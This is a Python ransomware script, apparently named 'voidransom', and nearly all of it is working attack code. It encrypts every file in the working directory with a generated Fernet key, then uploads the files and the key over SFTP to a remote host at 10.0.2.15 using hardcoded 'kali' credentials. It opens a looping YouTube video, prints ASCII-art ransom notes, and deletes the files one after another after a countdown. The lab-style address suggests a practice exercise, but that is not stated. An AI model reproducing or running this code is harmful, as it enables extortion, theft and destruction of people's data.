#!/usr/bin/env python3

from cryptography.fernet import Fernet
import os
import time
import subprocess
import paramiko
import webbrowser

#find files

files = []

for file in os.listdir():
    if file == "voidransom.py" or file == "thekey.key" or file =="voiddecrypt.py":
        continue
    files.append(file)
    if os.path.isfile(file):
        files.append(file)


#create key

key = Fernet.generate_key()
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

#encryption process

for file in  files:
        with open(file, "rb") as thefile:
             contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
             thefile.write(contents_encrypted)

# Exfiltrate files using SCP

destination_ip = "10.0.2.15"  # Replace with the actual IP
destination_username = "kali"  # Replace with the actual username
destination_password = "kali"  # Replace with the actual password
destination_path = "/home/kali/Desktop/exfildata/"  # Location to exfiltrate data

# List all files in the current directory
files = [f for f in os.listdir() if os.path.isfile(f)]

# Establish SSH connection
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(destination_ip, username=destination_username, password=destination_password)

# SCP the files
for file in files:
    source_file = os.path.join(os.getcwd(), file)
    destination_file = f"{destination_path}/{file}"
    sftp = ssh.open_sftp()
    sftp.put(source_file, destination_file)
    sftp.close()
    print(f"File {file} has been stolen!!!")

# SCP the encryption key
key_source_file = "thekey.key"
key_destination_file = f"{destination_path}/thekey.key"
sftp = ssh.open_sftp()
sftp.put(key_source_file, key_destination_file)
sftp.close()

# Close SSH connection
ssh.close()

# Your YouTube video URL with loop parameter
youtube_video_url = "https://www.youtube.com/watch?v=k0J6MeEfFAc&ab_channel=Napsilon&loop=1"

# Open the YouTube video in the default web browser and play on loop
webbrowser.open_new(youtube_video_url)

# ransom note

ascii_dedops = """
                                                                              
                                      ,----..                                 
    ,---,                            /   /   \                                
  .'  .' `\                  ,---,  /   .     : ,-.----.                      
,---.'     \               ,---.'| .   /   ;.  \\    /  \                     
|   |  .`\  |              |   | :.   ;   /  ` ;|   :    |  .--.--.           
:   : |  '  |   ,---.      |   | |;   |  ; \ ; ||   | .\ : /  /    '          
|   ' '  ;  :  /     \   ,--.__| ||   :  | ; | '.   : |: ||  :  /`./          
'   | ;  .  | /    /  | /   ,'   |.   |  ' ' ' :|   |  \ :|  :  ;_            
|   | :  |  '.    ' / |.   '  /  |'   ;  \; /  ||   : .  | \  \    `.         
'   : | /  ; '   ;   /|'   ; |:  | \   \  ',  / :     |`-'  `----.   \        
|   | '` ,/  '   |  / ||   | '/  '  ;   :    /  :   : :    /  /`--'  /        
;   :  .'    |   :    ||   :    :|   \   \ .'   |   | :   '--'.     /         
|   ,.'       \   \  /  \   \  /      `---`     `---'.|     `--'---'          
'---'          `----'    `----'                   `---`                       
"""

print(ascii_dedops)  

ascii_note = r"""
 _ _   _    _ _                                _       _          _     
( | ) / \  | | |  _   _  ___  _   _ _ __    __| | __ _| |_ __ _  (_)___ 
 V V / _ \ | | | | | | |/ _ \| | | | '__|  / _` |/ _` | __/ _` | | / __|
    / ___ \| | | | |_| | (_) | |_| | |    | (_| | (_| | || (_| | | \__ \
   /_/   \_\_|_|  \__, |\___/ \__,_|_|     \__,_|\__,_|\__\__,_| |_|___/
                  |___/           _           _ _                       
  ___ _ __   ___ _ __ _   _ _ __ | |_ ___  __| | |                      
 / _ \ '_ \ / __| '__| | | | '_ \| __/ _ \/ _` | |                      
|  __/ | | | (__| |  | |_| | |_) | ||  __/ (_| |_|                      
 \___|_| |_|\___|_|   \__, | .__/ \__\___|\__,_(_)_                     
|  _ \| | ___  __ _ __|___/|_| ___  ___ _ __   __| |          
| |_) | |/ _ \/ _` / __|/ _ \ / __|/ _ \ '_ \ / _` |        
|  __/| |  __/ (_| \__ \  __/ \__ \  __/ | | | (_| |       
|_|   |_|\___|\__,_|___/\___| |___/\___|_| |_|\__,_|         
     _       _   _                           _                       
 ___| | ___ | |_| |__  ___    __ _ _ __   __| |  _ __ ___   __ _ _   _  
/ __| |/ _ \| __| '_ \/ __|  / _` | '_ \ / _` | | '_ ` _ \ / _` | | | | 
\__ \ | (_) | |_| | | \__ \ | (_| | | | | (_| | | | | | | | (_| | |_| | 
|___/_|\___/ \__\_| |_|___/  \__,_|_| |_|\__,_| |_| |_| |_|\__,_|\__, | 
 / _|_ __ ___  ___  | |_| |__   ___    __| | __ _| |_ __ _| ( | )|___/  
| |_| '__/ _ \/ _ \ | __| '_ \ / _ \  / _` |/ _` | __/ _` | |V V        
|  _| | |  __/  __/ | |_| | | |  __/ | (_| | (_| | || (_| |_|           
|_| |_|  \___|\___|  \__|_| |_|\___|  \__,_|\__,_|\__\__,_(_)                                    
"""
print(ascii_note)

                                                          
ascii_art = """
⣿⣿⣿⣿⣿⠟⠋⠉⠀⠀⣀⠈⠉⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠉⠈⣀⠀⠀⠉⠙⠿⣿⣿⣿⣿⣿
⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠉⠙⠓⢶⣭⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣥⡶⠚⠋⠁⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿
⣿⣿⣿⢁⣀⣤⣤⣤⣤⣀⡀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⣤⣀⡘⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⢀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠟⠛⣉⣉⣉⣏⣙⠛⠿⣿⣦⠈⣿⣿⣿⣿⣿⣿⣿⡟⢀⣴⡿⠿⠛⡋⣹⣍⣉⣉⠛⠻⣿⣿⣿⣿⣿⣿⣿
⣿⣧⠹⣿⣿⡟⠁⠔⠉⠁⠀⠀⠀⠀⠈⠐⠀⠙⣷⣼⢸⣿⣿⣿⣿⡇⣧⡾⠉⠀⠊⠁⠀⠀⠀⠀⠈⠙⠢⠈⢻⣿⣿⢏⣽⣿
⣿⣿⠗⠈⠉⠀⠘⠤⠤⣀⣀⠀⡀⠀⠀⠤⠀⢀⣿⣿⢸⣿⣿⣿⣿⡇⣿⣷⡀⠠⠤⣀⡀⢀⡀⡀⡀⠤⠔⠃⢀⠉⠁⠺⢿⣿
⡿⢃⣴⣾⣿⣿⣷⣶⣤⣤⣄⣠⣇⣤⣴⣶⣾⣿⣿⡇⢸⣿⣿⣻⣿⡇⢻⣿⣿⣷⣶⣦⣤⣼⣄⣤⣤⣤⣶⣾⣿⣿⣷⣦⡘⢿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⢸⡟⣿⣿⣿⡇⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⣿⣿⣿⡇⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⣠⣾⠀⣸⣿⣿⣿⣿⡇⢸⣦⡀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣏⠻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⣩⢁⣾⣿⣿⠀⣿⣿⣿⣿⣿⣧⠀⣿⣿⣦⢸⡇⠈⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⠏⣻⣿
⣿⣿⡄⠈⢙⠛⠛⠛⢋⣉⣀⣤⣶⣾⣿⡌⣿⡟⢿⡀⠿⣿⣿⣿⣿⠟⢠⡿⠿⡟⣸⣿⣷⣦⣤⣈⣉⡙⠛⠛⠛⡋⠁⢰⣿⣿
⣿⣿⣷⠀⠘⣦⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣧⣤⡵⠦⣤⣭⣭⡤⠴⢥⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⢀⣾⠁⢀⣿⣿⣿
⣿⣿⣿⣧⠀⠸⣷⡀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⢀⡀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⢠⣾⠃⢀⣾⣿⣿⣿
⣿⣿⣿⣿⣧⠀⠙⣿⣄⠀⠈⠙⠛⠛⠉⠉⠉⠀⠀⠀⠀⣰⣿⣿⣄⠀⠀⠀⠀⠉⠉⠉⠙⠛⠋⠀⠀⣰⡿⠃⢀⣾⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣧⡀⠈⠻⣦⣄⣀⣀⣀⣀⣀⡀⠀⠀⠀⠾⠿⠿⠿⠿⠦⠀⠀⠀⣀⣀⣀⣀⣀⣀⣠⣾⠟⠀⢀⣾⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣷⣄⠐⣦⡙⠿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣿⣿⣿⣿⣿⠟⣋⡴⠁⣠⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣦⡘⢿⣷⣶⣭⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣯⣭⣶⣾⡿⢁⣼⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣌⠻⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⠟⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡙⢿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡿⢋⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
"""

print(ascii_art)

print("You have 2 minutes to pay ransom! Else an file will be destroyed in 60 seconds!!!")

# set time for file deletion (e.g., 10 seconds)
time.sleep(120)

# delete individual files
for file in files:
    try:
        os.remove(file)
        print(f"File {file} is gone :((((((((")
        # Introduce a delay (e.g., 1 second) between deletions
        time.sleep(60)
    except Exception:
        pass # Passes as file already deleted

print("Too slow your data is gone!!!!")